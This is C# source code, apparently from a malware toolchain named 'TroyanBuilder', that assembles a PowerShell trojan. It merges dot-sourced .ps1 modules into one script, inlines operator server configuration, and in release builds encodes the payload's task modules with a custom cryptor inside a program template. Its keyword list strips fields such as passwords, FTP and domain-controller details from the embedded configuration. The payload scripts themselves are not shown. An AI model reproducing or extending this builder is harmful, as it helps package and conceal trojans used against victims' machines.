using System.Diagnostics.CodeAnalysis;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using model;

namespace TroyanBuilder;

[SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
public abstract class CustomBuilder
{
    public class SourceFile
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public bool IsDo { get; set; }
        public bool Loaded { get; set; }

        public string CryptedData()
        {
            return CustomCryptor.Encode(Data);
        }
    }

    protected abstract string SourceDir {get;}
    
    protected abstract string OutputFile { get; }
    
    protected abstract string EntryPoint { get; }
    protected abstract string[] PriorityTasks { get; }
    protected abstract string[] UnpriorityTasks { get; }
    
    private ServerService Svc;
    protected ServerModel Model = new();
    private List<SourceFile> SourceFiles = new();
    private List<SourceFile> DoFiles => SourceFiles
        .Where(a=> a.IsDo == true).ToList();
    private List<SourceFile> NonDoFiles => SourceFiles
        .Where(a=> a.IsDo == false).ToList();

    
    private readonly StringBuilder Builder = new();
    protected readonly List<string> Result = new();
    
    public virtual List<string> Build(string server)
    {
        Svc = new ServerService();
        var srv = Svc.GetServer(server, true, false, "localhost");
        Model = srv.ServerModel!;
        MakeConsts();
        InternalBuild(server);
        SourceFiles = GetSourceFiles();
        CompileSources();
        var directoryPath = Path.GetDirectoryName(OutputFile);
        if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
            Directory.CreateDirectory(directoryPath);
        
        Build();
        PostBuild();
        return Result;
    }

    protected virtual void PostBuild()
    {
        
    }
    
    private void MakeConsts()
    {
        var template = @"
$server = @'
_SERVER
'@ | ConvertFrom-Json
";

        var keywords = new List<string>
        {
            "Dir","holder","body","operation", "troyan", "dnSponsor", "ftp", "user", "alias","_operate","StatusLabel",
            "login", "password", "ico", "domainController",
            "interfaces", "bux", "landing", "php", "domainIp"
        };

        var serverFilePath = Model.UserServerFile;
        var serverJson = File.ReadAllText(serverFilePath);
        var server = JsonNode.Parse(serverJson)!;

        JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
        {
            var filteredDictionary = serverObject.AsObject()
                .Where(kvp => !filterKeywords.Any(a=> kvp.Key.ToLower().ToLower().Contains(a.ToLower())))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            return JsonNode.Parse(JsonSerializer.Serialize(filteredDictionary))!;
        }

        var filteredObject = FilterObjectByKeywords(server, keywords);
        var serverJsonString = JsonSerializer.Serialize(filteredObject, new JsonSerializerOptions { WriteIndented = true });
        template = template.Replace("_SERVER", serverJsonString);

        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
        File.WriteAllText(outputPath, template);
    }
    
    private bool IsDebug => this.GetType().Name.Contains("Debug");

    private void Build()
    {
        if (IsDebug)
        {
            BuildDebug();
        }
        else
        {
            BuildRelease();
        }
    }
    
    private void BuildDebug()
    {
        foreach (var x in NonDoFiles)
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        Builder.AppendLine("");
        foreach (var x in DoFiles)
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        foreach (var sourceFile in DoFiles)
        {
            var doX = $"do_{sourceFile.Name}";
            Builder.AppendLine(doX);
        }
        
        File.WriteAllText(OutputFile,Builder.ToString());
    }

    private void BuildRelease()
    {
        foreach (var x in SourceFiles.Where(a=> a.Name == EntryPoint))
        {
            Builder.Append(x.Data);
            Builder.AppendLine();
        }
        Builder.AppendLine("");
        
        var psString = new StringBuilder();
        foreach (var kvp in DoFiles)
            psString.AppendLine($"    \"{kvp.Name}\" = \"{kvp.CryptedData()}\"");
        var doo = psString.ToString();
        
        var dataProd = Builder.ToString();
        var programRaw = ReadSource("program");
        (var head, var body) = ExtractHeadAndBody(programRaw.Data);
        body = body.Replace("###doo", doo);
        dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
        File.WriteAllText(OutputFile,dataProd);
    }

    protected abstract void InternalBuild(string server);
    
    private void CompileSources()
    {
        for (int i = 0; i < SourceFiles.Count; i++)
        {
            var sourceFile = SourceFiles[i];
            sourceFile = ReadSource(sourceFile.Name);
            SourceFiles[i] = sourceFile;
        }
    }
    
    
    protected string PfxFile(string domain)
    {
        return Path.Combine(Model.CertDir, domain + ".pfx");
    }

    protected virtual List<SourceFile> GetSourceFiles()
    {
        var files =Directory.GetFiles(SourceDir)
            .Select(Path.GetFileNameWithoutExtension)
            .ToArray().Except(new[] { "program" })!
            .SortWithPriority(PriorityTasks, UnpriorityTasks)
            .ToList();
        return files.Select(a=> new SourceFile(){Name = a}).ToList();
    }

    private SourceFile ReadSource(string sourceFile)
    {
        var result = new SourceFile() {Name = sourceFile};
        var path = "";
        var dir = SourceDir;
        while (!File.Exists(path))
        {
            path = Path.Combine(dir, sourceFile + ".ps1");
            dir = Path.Combine(dir,"..");
        }

        var lines = File.ReadAllLines(path).ToList();
        
        var units = new List<SourceFile>();
        
        int index = 0;
        while (index < lines.Count)
        {
            var line = lines[index];
            if (line.StartsWith(". ./"))
            {
                var relativePath = line[2..].Trim();
                var filenameWithoutExt = Path.GetFileNameWithoutExtension(relativePath);
                lines.RemoveAt(index);
                var linked = ReadSource(filenameWithoutExt);
                units.Add(linked);
            }
            else if (line.Trim().StartsWith("do_"))
            {
                lines.RemoveAt(index);
            }
            else
            {
                index++;
            }
        }

        var sb = new StringBuilder();

        foreach (var unit in units)
        {
            if (!IsDebug)
            {
                sb.AppendLine(unit.Data);
                sb.AppendLine("");
            }
        }

        foreach (var line in lines)
        {
            sb.AppendLine(line);
        }

        sb.AppendLine("");

        result.Data = sb.ToString();
        result.IsDo = result.Data.Contains($"function do_{sourceFile}");
        if (!IsDebug && result.IsDo)
        {
            result.Data += Environment.NewLine + $"do_{sourceFile}";
        }
        result.Loaded = true;

        return result;
    }
    
    static (string Head, string Body) ExtractHeadAndBody(string input)
    {
        var lines = input.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

        var head = new StringBuilder();
        var body = new StringBuilder();

        var headBegin = false;
        var headEnd = false;

        foreach (var line in lines)
        {
            if (line.Trim() == "###head")
            {
                if (!headBegin)
                {
                    headBegin = true;
                }
                else
                {
                    if (!headEnd)
                    {
                        headEnd = true;
                    }
                }
            }

            if ( !headBegin || (headBegin && !headEnd))
            {
                head.AppendLine(line);
            }
            else
            {
                body.AppendLine(line);
            }
        }

        return (head.ToString().Trim(), body.ToString().Trim());
    }
}